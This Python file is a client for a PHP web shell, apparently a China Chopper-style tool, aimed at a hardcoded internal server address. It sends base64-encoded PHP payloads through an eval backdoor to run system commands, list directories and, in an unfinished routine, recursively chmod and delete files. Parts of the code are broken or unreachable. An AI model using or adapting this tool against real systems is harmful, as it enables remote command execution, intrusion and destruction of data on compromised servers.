#! /usr/bin/env python
#! -*-coding:utf-8 -*-
'''
    注意 路径必须用.replace('\\', '\\\\')转换线
'''
import subprocess
import sqlite3
import re
from cmd import Cmd
import os
import sys
import urllib3
import urllib
import requests
import base64
import re
prompt = "pyshell> "
Object = None

url = 'http://172.28.100.76/1.php'
initcode = "@eval(base64_decode($_POST[x]));&x="

def post(url, data):
    header = {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN;'
    'rv:1.8.1.14) Gecko/20080404 (FoxPlus) Firefox/2.0.0.14'}
    req = requests.post(url, data=data, headers=header)
    return req.content

def oldpost(url, data):
	# http = urllib3.PoolManager(timeout = 3)
	userAgent = 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6'
	response = urllib.Request(url, data=data, headers={'User_Agent':userAgent})
	html = response.data
	return html
    # req.add_header('User-Agent', header)
    html = urllib3.urlopen(req)
    
    # html.close()

    

# 执行shell脚本
def DoShell():

	# url = raw_input('Pls input url:')
	code = input('Pls input cmd >')
	url = 'http://172.28.100.76/1.php'

	data = 'shellpass=system({0});'.format(code)
	response = oldpost(url, data)
	print (response)

# def Showrwx(num):
# 	permx = {1:'--x', 2:'-w-', 4:'r--', 7:"rwx"}
# 	if num in permx.keys():
# 		return permx[num]
# 	elif num == 3 :
# 		return "-wx"
# 	elif num == 5:
# 		return "r-x"
# 	elif num == 6:
# 		return "rw-"
# 	else:
# 		return "rwx"
# 	return string

# def ShowRule(list):
#     string = "total: {0}\nperm\t\tsize\t\tdate\t\tfile\n".format(len(list))
#     print string
#     for line in list:
#         string += "{0}".format(Showrwx(line[3][1]) + Showrwx(line[3][2]) + Showrwx(line[3][3]))
#         string += "\t{0}".format(line[2])
#         string += "\t{0}".format(line[1])
#         string += "\t{0}\n".format(line[0])
#     print string

#浏览文件目录
def GetFilePath():
	
	# url = raw_input('Pls input url:')
	url = 'http://172.28.100.76/1.php'
	# sitepath = raw_input('Pls input sitepath:')
	sitepath = 'c:\\'

	# shellpass只需要url编码
	# 函数名不URL编码也不base64编码
	# php代码需要base64编码
	code = '''shellpass=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGl
	uaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1
	b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk
	7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBP
	ciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkR
	ikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3
	Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkB
	maWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRM
	Lj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&z1='''
	# filelist = re.compile(r'\s*file:(.*)\stime:(.*)\ssize:(.*)\sperm:(.*)')
	# phpcode += "{0}".format(base64.b64encode(code)+"&z1="+base64.b64encode(sitepath))
	phpcode = code + base64.b64encode(sitepath)
	order = oldpost(url, phpcode)
	print (order)
	# if order == '-|ERROR:// Path Not Found Or No Permission!|<-':
	# 	print "Error: Path Not Found Or No Permission!"
	# 	return False
	# else:
	# 	print("website path: " + sitepath)
		# ShowRule(filelist.findall(order))

def DeleteFile(file):

	sitepath = '/'
	code = '''
    @ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);
    echo("-|");;function df($p){$m=@dir($p);while(@$f=$m->read()){$pf=$p."/".$f;
    if((is_dir($pf))&&($f!=".")&&($f!="..")){@chmod($pf,0777);df($pf);
    }if(is_file($pf)){@chmod($pf,0777);@unlink($pf);}}$m-close();@chmod($p,0777);
    return @rmdir($p);}$F=get_magic_quotes_gpc()?stripslashes($_POST["z1"]):$_POST["z1"];
    if(is_dir($F))echo(df($F));else{echo(file_exists($F)?@unlink($F)?"1":"0":"0");};echo("|<-");die();
    '''
    # phpcode = initcode
    # phpcode += "{0}&{1}".format(base64.b64encode(code), urllib.urlencode({"z1":sitepath + file}))
    # oldpost(url, phpcode)


if __name__ == '__main__':
	prompt = "pyshell> "
	Object = None
	op = input('Pls input num(1:DoShell;2:files management;3:DB):')
	if op == '1':
		DoShell()
	elif op == '2':
		GetFilePath()
		# DeleteFile()
	elif op == '3':
		pass